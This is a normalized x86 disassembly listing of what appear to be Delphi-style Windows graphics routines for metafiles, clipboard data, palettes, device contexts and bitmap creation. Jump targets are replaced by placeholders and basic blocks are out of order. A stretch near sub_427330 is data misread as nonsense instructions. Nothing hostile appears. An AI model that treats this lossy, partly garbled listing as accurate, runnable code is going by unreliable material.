call sub_40880c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c61c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043a8
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4256ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426cd8
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_426d2c
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_426f80
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
push esp
push 0x64
push esi
call GetEnhMetaFileHeader
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4221c4
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] esi
xor edx edx
mov [ eax + 0x1c ] edx
xor edx edx
mov [ eax + 0x20 ] edx
test esi esi
je r-xdata
push eax
call DeleteEnhMetaFile
call sub_424158
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esp 0x64
pop esi
pop ebx
retn
mov edx [ esp + 0x20 ]
sub edx [ esp + 0x18 ]
mov [ eax + 0xc ] edx
mov edx [ esp + 0x24 ]
sub edx [ esp + 0x1c ]
mov [ eax + 0x10 ] edx
sub_426dbc
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426968
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426e30
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426e30
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_426e30
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_426968
pop esi
pop ebx
retn
mov eax ebx
call sub_426f80
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426e6c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_426968
pop esi
pop ebx
retn
mov eax ebx
call sub_426f80
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_426eac
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426968
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426e6c
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_426e6c
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_426f20
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41be78
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_426f80
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_426968
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_4276e8
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_4276e4
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_427004
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_41be78
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_427110
mov edx ebx
mov eax esi
call sub_427084
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_427084
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427100
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41c0dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4027d4
retn
sub_427110
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402c58
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41c0dc
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41c0dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427232
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4027d4
retn
call sub_4241b8
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_424fa8
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42724b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4027b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42722b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_427258
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_426968
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_424128
sub_4272dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_427330
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
jae r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add ah al
aas
inc edx
add [ eax - 0x7ffbdc1 ] dh
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x64004273 ] dl
add [ eax ] al
inc edi
add al ch
int3
add [ 0x74694254 ] cl
insd
popad
jo r-xdata
rcl [ ebp + 0x68 ] 0x66
je r-xdata
popad
outsb
xor [ ecx ] al
add [ eax ] al
add [ edi + edi * 8 + 0x30 ] ah
call sub_41a238
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_423d04
test al al
je r-xdata
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42746d
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
pop edx
xor eax eax
push ebp
push sub_42743e
push [ fs : eax ]
inc eax
add [ eax + 0x73 ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jae r-xdata
shl [ ebx + esi * 2 + 0xd070042 ] 0x54
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x6e614370
jbe r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
jbe r-xdata
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x6e614370
add [ ecx + ebx + 0x34940042 ] al
inc eax
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ esi * 2 - 0x573fffbe ] ch
inc ecx
add al cl
test al 0x41
add ah bl
add [ eax + eax ] ah
rcl [ ebp + 0x68 ] 0x3e
je r-xdata
jae r-xdata
mov eax [ rw-data ]
call sub_41a608
retn
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_427558
add [ edi + edi * 8 + 0x30 ] ah
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_423d60
retn
jae r-xdata
add al dh
sbb [ edx ] eax
add al 0x0
or [ edi + 0x72 ] al
popad
jo r-xdata
pop ecx
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41a5a4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427466
push [ fs : eax ]
sub_4273c8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41a5a4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427466
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42746d
mov eax [ rw-data ]
call sub_41a608
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42743e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_427558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_423d60
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a238
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_423d04
test al al
je r-xdata
sub_427474
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a5a4
mov esi eax
xor ecx ecx
push ebp
push sub_4274e4
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a608
retn
mov edx ebx
mov eax esi
call sub_41a238
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_427558
sub_4274f0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_423870
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42752c
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
call sub_427558
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423934
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_427558
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423b74
xor edx edx
push ebp
push sub_4275ec
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_423ee8
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41a5b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423d60
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_4275f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423b74
xor eax eax
push ebp
push sub_4276d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428914
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_427474
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428a14
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423ee8
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41a51c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423d60
retn
sub_4276e8
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_40324c
sub_427708
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_427474
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d420
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_427764
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_4221c4
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_427474
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_427474
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_4277b0
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_4249f4
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42785f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_42786c
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_4278b8
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_427474
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_424260
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424260
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_427f06
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4027b4
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_427c10
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_424140
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_424260
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_424260
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_424260
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_424260
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_427eb7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_427ea6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_427e84
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_424260
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_42786c
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4029b0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_4249f4
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_423754
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_418e04
